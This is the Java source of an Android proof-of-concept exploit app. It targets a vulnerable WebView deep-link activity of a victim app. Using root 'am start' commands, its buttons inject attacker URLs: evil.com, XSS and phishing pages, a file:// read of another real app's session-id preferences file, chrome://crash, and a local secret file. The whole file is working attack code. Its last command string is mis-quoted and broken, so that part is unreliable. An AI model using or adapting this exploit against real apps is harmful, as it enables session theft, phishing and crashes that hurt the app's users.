package com.nahid0x1.nahid0x1_exploit;


import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import java.io.File;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);


        // target app
        String package_name = "com.victim.android";
        String activity_name = ".deeplink.WebViewActivity";
        String vuln_value = "extra_url";

        // Buttons
        Button evil = findViewById(R.id.evil);
        Button jsalert = findViewById(R.id.jsalert);
        Button lfi = findViewById(R.id.lfi);
        Button phishing = findViewById(R.id.phishing);
        Button crash = findViewById(R.id.crash);
        Button read = findViewById(R.id.read);

        // Apply window insets
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });



        // execute evil.com
        evil.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String command = "am start -n " + package_name + "/" + activity_name + " -a android.intent.action.VIEW --es " + vuln_value + " https://evil.com";
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

        // JavaScript Alert
        jsalert.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String command = "am start -n " + package_name + "/" + activity_name + " -a android.intent.action.VIEW --es " + vuln_value + " https://nahid0x1.github.io/xss.html";
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

        // LFI
        lfi.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String command = "am start -n " + package_name + "/" + activity_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"file:///data/data/com.picsart.studio/shared_prefs/key.shop.session.id.xml\" --es \"type\" \"alert\"";
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

        // phishing via xss
        phishing.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String command = "am start -n " + package_name + "/" + activity_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"https://nahid0x1.github.io/xss2.html\"\n";
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });


        // crash
        crash.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String command = "am start -n " + package_name + "/" + activity_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"chrome://crash\" --es \"type\" \"alert\"";
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });


        // read file
        read.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String secretFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/sdcard/secret.txt";
                File secretFile = new File(secretFilePath);

                if (secretFile.exists()) {
                    String command = "am start -n \" + package_name + \"/\" + activity_name + \" -a \"android.intent.action.VIEW\" --es \" + vuln_value + \" \"file:///sdcard/secret.txt\" --es \"type\" \"alert\"";
                    try {
                        Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                    } catch (IOException e) {
                        e.printStackTrace();

                    }
                } else {
                    Toast.makeText(MainActivity.this, "file not found! first create a file named secret.txt in the /sdcard this path.", Toast.LENGTH_LONG).show();
                    Toast.makeText(MainActivity.this, "Store some text in secret.txt file.", Toast.LENGTH_SHORT).show();

                }

            }
        });


    }
}
